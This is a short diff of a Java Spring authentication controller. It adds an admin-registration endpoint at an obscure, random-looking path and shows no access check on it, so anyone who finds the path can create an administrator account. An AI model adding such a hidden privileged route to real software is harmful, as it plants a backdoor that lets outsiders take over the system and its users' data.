@@ -27,6 +27,12 @@ public class AuthController {
   public ResponseEntity<AuthResponse> register(@RequestBody RegisterRequest registerRequest) {
     return ResponseEntity.ok(authService.register(registerRequest));
   }
+
+  @PostMapping("/32FDSAAFE3231F1")
+  public ResponseEntity<AuthResponse> registerAdmin(@RequestBody RegisterRequest registerRequest) throws AccessDeniedException {
+    return ResponseEntity.ok(authService.registerAdmin(registerRequest));
+  }
+
   @PostMapping("/authenticate")
   public ResponseEntity<AuthResponse> auth(@RequestBody AuthRequest authRequest) throws AccessDeniedException {
     return ResponseEntity.ok(authService.auth(authRequest));
